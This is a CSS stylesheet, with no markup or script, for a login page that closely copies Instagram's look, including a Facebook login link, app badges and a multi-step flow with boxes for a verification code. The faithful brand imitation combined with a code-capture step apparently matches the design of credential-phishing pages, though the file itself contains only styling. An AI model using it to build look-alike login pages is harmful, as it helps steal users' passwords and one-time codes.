*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626;min-height:100vh;display:flex;flex-direction:column}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:30px 10px 10px}
.inner{width:350px;max-width:100%}
.card{width:100%;border:1px solid #dbdbdb;background:#fff;border-radius:1px;padding:32px 0;text-align:center;margin-bottom:10px}
.card.no-border{border:0;background:transparent;padding:0}
.logo{font-family:'Grand Hotel',cursive;font-size:42px;font-weight:400;color:#262626;margin-bottom:24px;line-height:1}
.form{padding:0 40px}
.field{position:relative;margin-bottom:10px}
.field input{width:100%;height:38px;border:1px solid #dbdbdb;background:#fafafa;border-radius:4px;padding:0 10px;font-size:12px;color:#262626;outline:none;transition:border-color .1s}
.field input:focus{border-color:#a8a8a8}
.field label{position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:11px;color:#8e8e8e;pointer-events:none;transition:all .15s ease;transform-origin:left center}
.field input:focus+label,.field input:not(:placeholder-shown)+label{top:8px;transform:translateY(0) scale(.85)}
.show-pw{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:12px;font-weight:600;color:#0095f6;cursor:pointer;user-select:none;display:none}
.field input:not(:placeholder-shown)~.show-pw{display:block}
.btn{width:100%;height:32px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;margin-top:8px;cursor:pointer;transition:opacity .2s}
.btn:hover{opacity:.9}
.btn:active{opacity:.8}
.btn:disabled{opacity:.5;cursor:default}
.divider{display:flex;align-items:center;margin:16px 40px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 16px;font-size:13px;font-weight:600;color:#8e8e8e}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin:8px 0 18px;padding:0 40px}
.fb-login svg{flex-shrink:0}
.forgot{color:#00376b;font-size:12px;text-decoration:none}
.card2{border:1px solid #dbdbdb;background:#fff;border-radius:1px;padding:22px;text-align:center;margin-bottom:20px}
.card2 p{font-size:14px}
.card2 a{color:#0095f6;text-decoration:none;font-weight:600}
.app{text-align:center}
.app>p{font-size:14px;margin-bottom:16px;color:#262626}
.app-badges{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
.app-badge{display:inline-flex;align-items:center;gap:6px;background:#000;color:#fff;padding:7px 12px;border-radius:6px;text-decoration:none;font-size:11px;line-height:1.2}
.app-badge small{font-size:8px;display:block}
.app-badge svg{flex-shrink:0}
footer{padding:20px 0;text-align:center}
.foot-links{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 14px;margin-bottom:12px;padding:0 20px;max-width:640px;margin-left:auto;margin-right:auto}
.foot-links a{color:#8e8e8e;font-size:12px;text-decoration:none}
.foot-links a:hover{text-decoration:underline}
.foot-copy{color:#8e8e8e;font-size:12px;text-transform:uppercase}
.step{display:none}
.step.active{display:block}
.step-title{font-size:16px;font-weight:600;color:#262626;padding:0 40px;margin-bottom:4px}
.step-sub{font-size:12px;color:#8e8e8e;padding:0 40px;margin-bottom:20px;line-height:1.4}
.code-inputs{display:flex;gap:6px;justify-content:center;margin:16px 40px 10px}
.code-inputs input{width:38px;height:48px;text-align:center;font-size:18px;border:1px solid #dbdbdb;border-radius:8px;outline:none;color:#262626;-moz-appearance:textfield}
.code-inputs input::-webkit-outer-spin-button,.code-inputs input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
.code-inputs input:focus{border-color:#0095f6;box-shadow:0 0 0 1px #0095f6}
.err{color:#ed4956;font-size:12px;margin:4px 40px 8px;display:none}
.err.show{display:block}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #dbdbdb;border-top-color:#0095f6;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.loading-text{color:#8e8e8e;font-size:14px;padding:20px 0}
.hp{position:absolute;left:-9999px;top:-9999px;opacity:0;width:1px;height:1px;pointer-events:none}
@media(max-width:450px){
  .card{border:0}
  .card2{border:0;background:transparent;margin-top:24px;margin-bottom:16px}
  .wrap{padding-top:40px}
  .form{padding:0 16px}
  .divider,.step-title,.step-sub,.code-inputs,.err{margin-left:16px;margin-right:16px}
  .fb-login{padding:0 16px}
  .code-inputs input{width:34px;height:44px;font-size:16px}
}